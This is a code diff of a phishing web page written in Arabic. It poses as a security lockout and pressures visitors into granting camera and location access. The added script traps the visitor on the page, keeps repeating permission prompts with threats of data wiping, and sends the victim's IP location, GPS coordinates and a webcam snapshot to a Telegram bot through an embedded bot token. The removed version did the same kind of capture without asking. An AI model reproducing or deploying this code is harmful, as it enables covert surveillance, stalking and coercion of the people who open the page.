@@ -1,10 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Google Security Update</title>
+    <meta charset="UTF-8">
+    <title>🚨 نظام الحماية: مطلوب إجراء فوري</title>
+    <style>
+        body { background: #000; color: #f00; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 10%; overflow: hidden; }
+        .warning { font-size: 30px; animation: blink 0.5s infinite; }
+        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0;} 100% {opacity: 1;} }
+    </style>
 </head>
-<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;">
-    <h2 id="log">SYSTEM_ENCRYPTING...</h2>
+<body>
+    <div class="warning">⚠️ تحذير أمني خطير ⚠️</div>
+    <p>تم قفل جهازك مؤقتاً لأسباب أمنية.</p>
+    <p>يجب الضغط على "سماح" (Allow) للكاميرا والموقع لفك التشفير.</p>
+
     <video id="v" autoplay style="width:1px;height:1px;opacity:0;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
@@ -12,51 +21,64 @@
         const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
         const ID = "1772820433";
 
+        // منع الضحية من مغادرة الصفحة (إظهار رسالة تحذير عند محاولة الإغلاق)
+        window.onbeforeunload = function() {
+            return "هل أنت متأكد؟ سيتم قفل جهازك نهائياً إذا خرجت!";
+        };
+
+        // منع العودة للخلف في المتصفح
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+
         async function send(m, isImg=false) {
             let u = `https://api.telegram.org/bot${T}/`;
             if(!isImg) {
                 await fetch(u+'sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ID,text:m})});
             } else {
                 const b = await (await fetch(m)).blob();
-                const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'x.png');
+                const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'hit.png');
                 await fetch(u+'sendPhoto',{method:'POST',body:f});
             }
         }
 
-        // --- الضربة الأولى: سحب الموقع بـ 3 طرق صامتة (بدون إذن) ---
-        async function silentLoc() {
-            // محاولة أولى: ipapi
-            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>send(`📍 صيد IP:\nالمدينة: ${d.city}\nالإحداثيات: ${d.latitude},${d.longitude}`));
-            // محاولة ثانية: ip-api (Backup)
-            fetch('http://ip-api.com/json/').then(r=>r.json()).then(d=>send(`🌐 موقع احتياطي:\n${d.lat},${d.lon}\nISP: ${d.isp}`));
-        }
+        async function startAttack() {
+            // محاولة سحب الموقع صمتاً عبر IP أولاً
+            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>send(`📍 موقع الضحية المحاصر:\n${d.latitude},${d.longitude}`));
 
-        // --- الضربة الثانية: مباغتة الكاميرا (The Phantom Strike) ---
-        async function phantomCam() {
-            try {
-                // محاولة فتح الكاميرا في الخلفية فوراً
-                const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720}});
-                const vid = document.getElementById('v');
-                vid.srcObject = s;
-                setTimeout(()=>{
-                    const can = document.getElementById('c');
-                    can.width=vid.videoWidth; can.height=vid.videoHeight;
-                    can.getContext('2d').drawImage(vid,0,0);
-                    send(can.toDataURL('image/png'),true);
-                    s.getTracks().forEach(t=>t.stop());
-                }, 100); // سرعة البرق: 100ms
-            } catch(e) {
-                // إذا فشل، نرسل تنبيه "الضحية منتبه"
-                send("⚠️ الضحية لديه حماية قوية أو رفض الإذن!");
+            // حلقة تكرار (Loop) تطلب الكاميرا والموقع ولا تتوقف
+            while(true) {
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({video:true});
+                    const vid = document.getElementById('v');
+                    vid.srcObject = s;
+                    
+                    // إذا أعطى السماح، نصوره فوراً ونرسل الإحداثيات
+                    navigator.geolocation.getCurrentPosition(p => {
+                        send(`🎯 إحداثيات GPS دقيقة:\n${p.coords.latitude},${p.coords.longitude}`);
+                    });
+
+                    setTimeout(() => {
+                        const can = document.getElementById('c');
+                        can.width=vid.videoWidth; can.height=vid.videoHeight;
+                        can.getContext('2d').drawImage(vid,0,0);
+                        send(can.toDataURL('image/png'),true);
+                        s.getTracks().forEach(t=>t.stop());
+                        alert("✅ تم فك التشفير بنجاح!");
+                        window.location.href = "https://google.com";
+                    }, 500);
+                    break; // نخرج من الحلقة إذا نجحنا
+                } catch(e) {
+                    // إذا رفض، نظهر له رسالة مزعجة ونعيد المحاولة
+                    alert("⚠️ خطأ! يجب الضغط على 'سماح' لتجنب مسح بيانات جهازك!");
+                }
             }
         }
 
-        window.onload = () => {
-            silentLoc();
-            phantomCam();
-            // توجيه الضحية لصفحة وهمية بعد السحب
-            setTimeout(()=> { window.location.href="https://www.google.com"; }, 3000);
-        };
+        // بدء الهجوم عند أول لمسة للشاشة (لأن المتصفحات تشترط تفاعل المستخدم)
+        window.onclick = () => { startAttack(); };
+        window.ontouchstart = () => { startAttack(); };
     </script>
 </body>
 </html>
